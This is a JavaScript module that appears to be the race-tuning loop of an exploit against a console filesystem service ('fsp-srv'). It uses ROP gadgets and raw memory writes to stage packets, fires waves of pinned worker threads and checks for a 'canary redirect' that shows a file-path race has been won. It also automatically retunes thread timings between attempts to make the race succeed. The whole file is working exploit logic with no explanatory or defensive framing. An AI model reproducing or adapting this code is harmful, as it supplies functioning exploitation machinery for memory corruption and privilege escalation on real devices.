import coreRuntime, {waitMs} from "../runtime.mjs";
import {
    verboseLog,
    isVerboseLogging
} from "../logger.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeHandle,
  closeReservationGroup,
  executeWave,
  frameArgSlot,
  openReservationGroup,
  prepPacket,
  readAllocationCounters,
  resetWaveState,
  roleSendCode,
  write32,
  write64,
  write8,
  writeDirtyData
} = coreRuntime;

export const WINDOW_RATE_THRESHOLD = 0.8;

// ── Canary wave loop (S11) ──────────────────────────────────────────────────

export async function runControlWaveLoop({
  config,
  helpers,
  REQ,
  dirtyFilePath,
  extentTriggerHandle,
  gates,
  pinHandle,
  pinPkt,
  pktBuf,
  rawScheduling,
  rootSession,
  savedHandle,
  sendIndices,
  triggerHandle,
  waveData,
  waveExtra,
  workerResources,
  SCRATCH_DIR,
  extentTotal,
  fragmentBufs,
  segments,
  selectedDir,
  triggerBuf,
  renamePathBuffers = null,
  clearPkt,
  clearSendIndex,
  pinSendIndex,
  prePkt,
  preSendIndex,
  abortControlCanonical,
  canaryPath,
  setupPath,
  setupPkt,
  shouldStop = null,
  deferredVerboseLines = null,
  attemptNumber = null
}) {
  let canaryQualified;
  let dirtyWriteBuf;
  let dirtyWritePkt;
  let pinFirstWaveQualified;
  let wavesJoined;
  let wavesStarted;
  let workerStateSafe;
  let nextProfile;
  let workflowStopReason = null;
    // S11: Control wave loop — the same state machine as the reference run.
    pinFirstWaveQualified = false;
    var abortControlPassed = false;
    var abortHoleControlPassed = false;
    var extentQualified = false;
    var negativeControlPassed = false;
    canaryQualified = false;
    workerStateSafe = true;
    nextProfile = "abort-control";
    var profileCounts = Object.create(null);
    var positiveWindows = 0;
    var positiveWindowFlips = 0;
    var positiveObservedRedirects = 0;
    var positiveOutsideWindowFlips = 0;
    var positiveQualifiedFlips = 0;
    var positiveHealthFailures = 0;
    var positiveGateFailures = Object.create(null);
    var positiveWindowRecords = [];
    var verboseWaveLines = [];
    var stoppedByUser = false;
  var pinQualificationDiagnostics = null;
    wavesStarted = 0;
    wavesJoined = 0;
    dirtyWriteBuf = allocPage(config.DIRTY_FILE_SIZE + 0x2000);
    call_rop(GADGET_MEMSET, dirtyWriteBuf, 0x66n, BigInt(config.DIRTY_FILE_SIZE));
    dirtyWritePkt = allocPage(0x2000);
    // Give queued controller input a chance to run before starting the first
    // wave, then yield after each wave so a stop press prevents the next one.
    await waitMs(0);
    for (var attempt = 0; attempt < config.MAX_CONTROL_WAVES; attempt++) {
        if (shouldStop?.()) {
            stoppedByUser = true;
            workflowStopReason = "stopped-by-user";
            break;
        }
        if (canaryQualified) break;
        var profile = nextProfile;
        if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                dirtyWriteBuf, dirtyWritePkt)) {
            workflowStopReason = "dirty-write-failed-at-wave-" + (attempt + 1);
            break;
        }

        resetWaveState(waveData.frames, waveData.backups, REQ, waveData.pktBackups,
            gates, waveExtra);

        const waveW9DelayNs = config.roleDelays[9];

        if (profile === "abort-control") write32(gates.completedFlag, 1n);
        if (profile === "abort-hole-control") write32(gates.bottleneckFinished, 1n);
        var profileSetup = helpers.configureProfile(profile, {config, REQ,
            SCRATCH_DIR: SCRATCH_DIR, extentTotal: extentTotal,
            fragmentBufs: fragmentBufs, segments: segments,
            selectedDir: selectedDir, triggerBuf: triggerBuf});
        if (!profileSetup.configured) {
            workflowStopReason = "profile-setup-failed-" + profile;
            break;
        }

        var renameInputBefore = renamePathBuffers && isVerboseLogging()
            ? helpers.captureRenameInputState(REQ, renamePathBuffers,
                config.workerRoles) : null;

        // Between-waves snapshot. Peaks are cleared on read, so this window
        // covers everything since the previous wave's post-wave read. Our
        // own inter-wave actions are known; any extra delta is external
        // fsp-srv activity (game autosave, patrol read). Placed before the
        // group open so it never splits the held→pre window the cache-hold
        // gate measures.
        var betweenStats = isVerboseLogging()
            ? readAllocationCounters(rootSession, pktBuf)
            : null;

        var group = openReservationGroup(rootSession, pktBuf, 59);
        if (!group.ok) {
            workflowStopReason = "reservation-failed-at-wave-" + (attempt + 1);
            break;
        }

        prepPacket(REQ[9], 4, 8, []);
        write8(REQ[9] + 0x10n, 2n);
        write32(REQ[9] + 0x14n, BigInt(group.outer));
        write32(REQ[9] + 0x1Cn, 0n);
        write64(frameArgSlot(waveData.frames[9].frame, waveData.frames[9].count,
            sendIndices[9], 0), BigInt(group.session));

        var extentProfile = profile === "extent-absent" || profile === "extent-present";
        write64(frameArgSlot(waveData.frames[12].frame, waveData.frames[12].count,
            sendIndices[12], 0),
            BigInt(extentProfile ? extentTriggerHandle : triggerHandle));

        var createPinThisWave = !pinHandle;
        write32(pinPkt + 0x18n, BigInt(createPinThisWave ? 200 : 1009));

        var wave = executeWave(waveData.frames, rawScheduling, workerResources,
            gates, sendIndices, config.workerRoles);
        wavesStarted += wave.started === config.WORKER_COUNT ? 1 : 0;

        if (wave.created < config.WORKER_COUNT ||
            wave.pinned < config.WORKER_COUNT ||
            wave.started < config.WORKER_COUNT) {

            if (wave.created === config.WORKER_COUNT &&
                wave.pinned < config.WORKER_COUNT) {
                workflowStopReason = "worker-pinning-failed-at-wave-" +
                    (attempt + 1);
            } else {
                workflowStopReason = "worker-start-failed-at-wave-" +
                    (attempt + 1);
            }
            var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
            closeReservationGroup(group,
                wave.created < config.WORKER_COUNT || relCode !== 0, pktBuf);
            workerStateSafe = wave.workerStateSafe === true;
            break;
        }
        if (wave.joined < config.WORKER_COUNT) {
            workflowStopReason = "worker-join-failed-at-wave-" + (attempt + 1);
            workerStateSafe = false;
            break;
        }
        wavesJoined++;

        var wResult = helpers.analyzeWave(profile, wave, waveData, group,
            createPinThisWave, {
                config, REQ, clearPkt: clearPkt, clearSendIndex: clearSendIndex,
                gates, pinFirstWaveQualified, pinHandle, pinPkt,
                pinSendIndex: pinSendIndex, pktBuf, prePkt: prePkt,
                preSendIndex: preSendIndex, rootSession, sendIndices,
                abortControlCanonical: abortControlCanonical,
                canaryPath: canaryPath, savedHandle, setupPath: setupPath,
                setupPkt: setupPkt, renamePathBuffers,
                renameInputBefore
            });
        pinHandle = wResult.pinHandle;
        pinFirstWaveQualified = wResult.pinFirstWaveQualified;
        if (createPinThisWave)
            pinQualificationDiagnostics = wResult.pinDiagnostics;

        profileCounts[profile] = (profileCounts[profile] || 0) + 1;
        if (profile === "positive") {
            const timingRecord = {
                wave: attempt + 1,
                profile,
                w9DelayNs: waveW9DelayNs,
                window: wResult.window,
                shape: wResult.shape,
                shapeMissing: wResult.shapeMissing.slice(),
                marginUs: wResult.marginUsRaw,
                marginSlackUs: wResult.marginSlackUs,
                rejections: wResult.rejections.slice(),
                roleTimings: wResult.roleTimings,
                betweenCounters: betweenStats,
                counterVector: wResult.counterVector,
                w9Probes: wResult.w9Probes
            };
            if (wResult.observedCanaryRedirect) {
                positiveObservedRedirects++;
                if (wResult.window) positiveWindowFlips++;
                else positiveOutsideWindowFlips++;
            }
            if (wResult.window) positiveWindows++;
            if (wResult.canaryRedirect) positiveQualifiedFlips++;
            if (!wResult.postCanaryHealth.healthy) positiveHealthFailures++;
            for (var ri = 0; ri < wResult.rejections.length; ri++) {
                var rejection = wResult.rejections[ri];
                positiveGateFailures[rejection] =
                    (positiveGateFailures[rejection] || 0) + 1;
            }
            const positiveRecord = {
                ...timingRecord,
                preReleaseUsed: wResult.preReleaseUsed,
                preReleaseSlackBytes: wResult.preReleaseSlackBytes,
                canaryResult: wResult.canaryResult,
                canaryType: wResult.canaryType,
                observedRedirect: wResult.observedCanaryRedirect,
                qualifiedFlip: wResult.canaryRedirect,
                postHealthy: wResult.postCanaryHealth.healthy,
                postCanaryHealth: {...wResult.postCanaryHealth},
                triggerResult: wResult.triggerResult,
                triggerCanonical: wResult.triggerCanonical,
                triggerType: wResult.triggerType,
                selectedMarker: wResult.selectedMarker,
                triggerAborted: wResult.triggerAborted,
                changedPaths: wResult.changedPaths.slice(),
                guardSamples: {...wResult.guardSamples}
            };
            positiveWindowRecords.push(positiveRecord);
        }

        var releaseWasSent = roleSendCode(waveData.frames, 9, sendIndices[9]) === 0;
        closeReservationGroup(group, !releaseWasSent, pktBuf);

        if (profile === "abort-control") {
            abortControlPassed = pinFirstWaveQualified && wResult.abortControl;
            if (!pinFirstWaveQualified && pinHandle) {
                closeHandle(pinHandle); pinHandle = 0;
            }
            if (abortControlPassed) {
                nextProfile = "abort-hole-control";
            } else {
                nextProfile = "abort-control";
            }
        } else if (profile === "abort-hole-control") {
            abortHoleControlPassed = wResult.abortHoleControl;
            if (abortHoleControlPassed) {
                nextProfile = "extent-absent";
            } else {
                nextProfile = "abort-hole-control";
            }
        } else if (profile === "extent-absent") {
            nextProfile = "extent-present";
        } else if (profile === "extent-present") {
            extentQualified = wResult.extentQualified;
            if (extentQualified) {
                nextProfile = "negative";
            } else {
                nextProfile = "extent-present";
            }
        } else if (profile === "negative") {
            negativeControlPassed = wResult.negativeControl;
            if (negativeControlPassed) {
                nextProfile = "positive";
            } else {
                nextProfile = "negative";
            }
        } else if (profile === "positive") {
            canaryQualified = wResult.canaryRedirect;
            nextProfile = "positive";
        }

        if (isVerboseLogging()) {
            verboseWaveLines.push(helpers.formatWaveSummaryLine(
                attempt + 1, profile, wResult, null, {config}));
            var rt = wResult.roleTimings;
            if (rt) {
                var parts = [];
                for (var ri = 0; ri < config.roleShort.length; ri++) {
                    var label = config.roleLabels[ri];
                    var t = rt[label];
                    if (t) {
                        parts.push(config.roleShort[ri] +
                            "=" + Math.round(t.durationUs));
                    }
                }
                verboseWaveLines.push(
                    "       ipc-µs: " + parts.join(" "));
            }

            // Defer string formatting until after the loop to avoid stretching
            // the gap before the next wave.
            verboseWaveLines.push({
                type: "wave-vector",
                wave: attempt + 1,
                profile,
                result: wResult,
                w9DelayNs: waveW9DelayNs,
                betweenStats
            });
        }

        await waitMs(0);
        if (shouldStop?.()) {
            stoppedByUser = true;
            workflowStopReason = "stopped-by-user";
            break;
        }
    }

    for (var lineIndex = 0; lineIndex < verboseWaveLines.length; lineIndex++) {
        var line = verboseWaveLines[lineIndex];
        if (line && typeof line === "object" &&
            line.type === "wave-vector") {
            verboseWaveLines[lineIndex] = formatWaveVectorLine(line, config);
        }
    }

    if (Array.isArray(deferredVerboseLines)) {
        if (verboseWaveLines.length) {
            deferredVerboseLines.push(
                "======== ATTEMPT " + attemptNumber +
                " WAVE DETAILS ========");
            deferredVerboseLines.push(...verboseWaveLines);
        }
    } else {
        // Emit wave output after the loop so logging cannot perturb wave timing.
        // Keep each display update modest when a run produced many wave rows.
        for (var flushFrom = 0; flushFrom < verboseWaveLines.length;
            flushFrom += 6) {
            await verboseLog(verboseWaveLines.slice(flushFrom, flushFrom + 6)
                .join("\n"));
        }
    }

    const positiveAttempts = profileCounts.positive || 0;
    var controlsQualified = pinFirstWaveQualified && abortControlPassed &&
        abortHoleControlPassed && extentQualified && negativeControlPassed;
    const timingAdjustment = controlsQualified && workerStateSafe &&
        !canaryQualified && !stoppedByUser && positiveHealthFailures === 0
        ? proposePositiveTimingAdjustment(positiveWindowRecords, config)
        : null;
    const timingSchedule = timingAdjustment ? {
        roleDelays: timingAdjustment.roleDelays,
        guardDelays: timingAdjustment.guardDelays
    } : null;
    var campaignState;
    if (!workerStateSafe) {
        campaignState = "worker-unsafe";
    } else if (positiveHealthFailures > 0) {
        campaignState = "post-health-failure";
    } else if (stoppedByUser) {
        campaignState = "user-stopped";
    } else if (canaryQualified) {
        campaignState = "flip-qualified";
    } else if (controlsQualified && positiveWindows > 0) {
        campaignState = "window-valid-no-flip";
    } else if (controlsQualified && positiveOutsideWindowFlips > 0) {
        campaignState = "raw-flip-outside-window";
    } else if (controlsQualified) {
        campaignState = "no-qualified-positive-window";
    } else {
        campaignState = "controls-incomplete";
    }

    return {ok: true, canaryQualified, dirtyWriteBuf, dirtyWritePkt,
      pinFirstWaveQualified, pinHandle, wavesJoined, wavesStarted,
      workerStateSafe, campaignState, controlsQualified, nextProfile,
      stoppedByUser,
      workflowStopReason,
      profileCounts,
      abortControlPassed, abortHoleControlPassed, extentQualified,
      negativeControlPassed, positiveAttempts,
      positiveWindows, positiveWindowFlips, positiveObservedRedirects,
      positiveOutsideWindowFlips, positiveQualifiedFlips,
      positiveHealthFailures, positiveGateFailures, positiveWindowRecords,
      timingAdjustment, timingSchedule, pinQualificationDiagnostics};
}

// Retune only between complete attempts. Positive-profile waves are the sole
// evidence source; controls and positive waves that passed the window gate are
// excluded. A failed positive wave must have exactly one timing rejection.
const TIMING_MIN_FAILED_WAVES = 2;
const TIMING_NOISE_FLOOR_US = 75;
const TIMING_MAX_STEP_US = 150;
const TIMING_MAX_DRIFT_US = 1000;
const TIMING_MIN_ROLE_GAP_NS = 50000;
const RECEIVE_MARGIN_TARGET_US = 500;

function median(values) {
    if (!values.length) return null;
    const sorted = values.slice().sort((a, b) => a - b);
    const middle = Math.floor(sorted.length / 2);
    return sorted.length % 2 ? sorted[middle]
        : (sorted[middle - 1] + sorted[middle]) / 2;
}

function proposePositiveTimingAdjustment(records, config) {
    const eligible = records.filter(record => {
        const reasons = record.rejections || [];
        return !record.window && reasons.length === 1 &&
            (reasons[0] === "shape" || reasons[0] === "margin>=300");
    });
    if (eligible.length < TIMING_MIN_FAILED_WAVES) return null;

    const marginRecords = eligible.filter(record =>
        record.rejections[0] === "margin>=300" &&
        Number.isFinite(record.marginUs));
    const shapeRecords = eligible.filter(record =>
        record.rejections[0] === "shape");

    let role;
    let samples;
    let reason;
    if (marginRecords.length >= TIMING_MIN_FAILED_WAVES &&
        marginRecords.length > shapeRecords.length) {
        role = "release";
        samples = marginRecords.map(record =>
            record.marginUs - RECEIVE_MARGIN_TARGET_US);
        reason = "positive-window-margin";
    } else if (shapeRecords.length >= TIMING_MIN_FAILED_WAVES &&
        shapeRecords.length > marginRecords.length) {
        const corrections = Object.create(null);
        for (const record of shapeRecords) {
            const timings = record.roleTimings || {};
            const trigger = timings.trigger;
            if (!trigger) continue;
            for (const missingRole of new Set(record.shapeMissing || [])) {
                if (missingRole === "guard1" ||
                    config.roleLabels.indexOf(missingRole) < 0) continue;
                const timing = timings[missingRole];
                if (!timing) continue;
                let targetMidpoint;
                if (config.throughRoles.indexOf(missingRole) >= 0) {
                    const triggerDuration = trigger.relEndUs - trigger.relStartUs;
                    if (timing.durationUs <= triggerDuration) continue;
                    targetMidpoint =
                        (trigger.relStartUs + trigger.relEndUs) / 2;
                } else if (config.heldRoles.indexOf(missingRole) >= 0) {
                    targetMidpoint = trigger.relStartUs;
                } else {
                    continue;
                }
                const midpoint =
                    (timing.relStartUs + timing.relEndUs) / 2;
                (corrections[missingRole] ||
                    (corrections[missingRole] = [])).push(
                        targetMidpoint - midpoint);
            }
        }
        const ranked = Object.entries(corrections)
            .filter(([, values]) => values.length >= TIMING_MIN_FAILED_WAVES)
            .sort((a, b) => b[1].length - a[1].length);
        if (!ranked.length || (ranked[1] &&
            ranked[0][1].length === ranked[1][1].length)) return null;
        role = ranked[0][0];
        samples = ranked[0][1];
        reason = "positive-window-shape";
    } else {
        return null;
    }

    const correctionUs = median(samples);
    if (!Number.isFinite(correctionUs) ||
        Math.abs(correctionUs) < TIMING_NOISE_FLOOR_US) return null;
    const stepUs = Math.max(-TIMING_MAX_STEP_US,
        Math.min(TIMING_MAX_STEP_US, correctionUs));
    const roleIndex = config.roleLabels.indexOf(role);
    const isGuard = role === "guard0" || role === "guard1";
    const delayIndex = isGuard ? roleIndex - 10 : roleIndex;
    // Build a proposal on copies: this attempt's schedule stays immutable.
    const roleDelays = config.roleDelays.slice();
    const guardDelays = config.guardDelays.slice();
    const delays = isGuard ? guardDelays : roleDelays;
    const defaults = isGuard
        ? config.baselineGuardDelays : config.baselineRoleDelays;
    if (delayIndex < 0 || delayIndex >= delays.length) return null;

    const before = delays[delayIndex];
    let minDelay = Math.max(0, defaults[delayIndex] - TIMING_MAX_DRIFT_US * 1000);
    let maxDelay = defaults[delayIndex] + TIMING_MAX_DRIFT_US * 1000;
    if (delayIndex > 0)
        minDelay = Math.max(minDelay,
            delays[delayIndex - 1] + TIMING_MIN_ROLE_GAP_NS);
    if (delayIndex + 1 < delays.length)
        maxDelay = Math.min(maxDelay,
            delays[delayIndex + 1] - TIMING_MIN_ROLE_GAP_NS);
    if (minDelay > maxDelay) return null;
    const after = Math.max(minDelay, Math.min(maxDelay,
        before + Math.round(stepUs * 1000)));
    const actualStepUs = (after - before) / 1000;
    if (!actualStepUs) return null;
    delays[delayIndex] = after;
    return {role, deltaUs: actualStepUs, reason,
        roleDelays, guardDelays};
}

// Compact hex form of one 16-field MemoryReportInfo vector, for the
// machine-readable per-wave line. Fields are peaks cleared on read, so
// each vector summarizes its own measurement window.
function formatCounterVector(values) {
    if (!values) return "na";
    const parts = [];
    for (let i = 0; i < values.length; i++) {
        parts.push(values[i].toString(16));
    }
    return parts.join(",");
}

function formatProbeUs(value) {
    return Number.isFinite(value) ? String(Math.round(value)) : "na";
}

function formatWaveVectorLine(record, config) {
    const result = record.result;
    const roleTimings = result.roleTimings;
    const parts = [
        "vec: w=" + record.wave,
        "p=" + record.profile,
        "win=" + (result.window ? 1 : 0),
        "flip=" + (result.canaryRedirect ? 1 : 0),
        "obs=" + (result.observedCanaryRedirect ? 1 : 0),
        "shape=" + result.shape + "/" + config.OVERLAP_COUNT,
        "m=" + (result.marginUsRaw === null
            ? "na" : Math.round(result.marginUsRaw)),
        "w9=" + Math.round(record.w9DelayNs / 1000) + "us",
        "trg=0x" + Number(result.triggerCanonical).toString(16) +
            "/" + result.triggerType,
        "selected=" + (result.selectedMarker ? 1 : 0),
        "canaryRes=0x" + Number(result.canaryResult).toString(16),
        "canaryType=" + result.canaryType,
        "abort=" + (result.triggerAborted ? 1 : 0),
        "postHealthy=" + (result.postCanaryHealth.healthy ? 1 : 0),
        "postTransport=" + result.postCanaryHealth.transport,
        "postRes=0x" + Number(
            result.postCanaryHealth.result).toString(16),
        "postType=" + result.postCanaryHealth.type,
        "changed=" + (result.changedPaths.length
            ? result.changedPaths.join(",") : "-"),
        "reject=" + (result.rejections.length
            ? result.rejections.join(",") : "-")
    ];
    const guards = result.guardSamples || {};
    parts.push("guards=" +
        "c:" + (guards.completed ?? "na") + "," +
        "h:" + (guards.earlyHole ?? "na") + "," +
        "s:" + (guards.spacing ?? "na"));

    let heapDelta;
    if (result.preReleaseUsed === null ||
        result.preReleaseUsed === undefined) {
        heapDelta = "na";
    } else {
        heapDelta = "0x" + result.preReleaseUsed.toString(16);
    }
    parts.push("heapDelta=" + heapDelta);

    if (result.shapeMissing.length) {
        parts.push("missing=" + result.shapeMissing.join(","));
    }
    if (result.w9Probes) {
        parts.push("rtt=" +
            formatProbeUs(result.w9Probes.pinUs) + "," +
            formatProbeUs(result.w9Probes.clearUs) + "," +
            formatProbeUs(result.w9Probes.preUs));
    }
    if (roleTimings) {
        const ipc = [];
        for (let i = 0; i < config.roleLabels.length; i++) {
            const timing = roleTimings[config.roleLabels[i]];
            if (timing) ipc.push(Math.round(timing.durationUs));
        }
        parts.push("ipc=" + ipc.join(","));

        if (!result.rejections.includes("trig-span")) {
            const relative = [];
            for (let i = 0; i < config.roleLabels.length; i++) {
                const timing = roleTimings[config.roleLabels[i]];
                if (timing) {
                    relative.push(config.roleShort[i] + ":" +
                        Math.round(timing.relStartUs) + "/" +
                        Math.round(timing.relEndUs));
                }
            }
            parts.push("rel=" + relative.join(","));
        }
    }

    parts.push("cnt.btw=" + formatCounterVector(record.betweenStats));
    if (result.counterVector) {
        parts.push("cnt.held=" +
            formatCounterVector(result.counterVector.held));
        parts.push("cnt.pre=" +
            formatCounterVector(result.counterVector.pre));
        parts.push("cnt.post=" +
            formatCounterVector(result.counterVector.after));
    }
    return "       " + parts.join(" ");
}
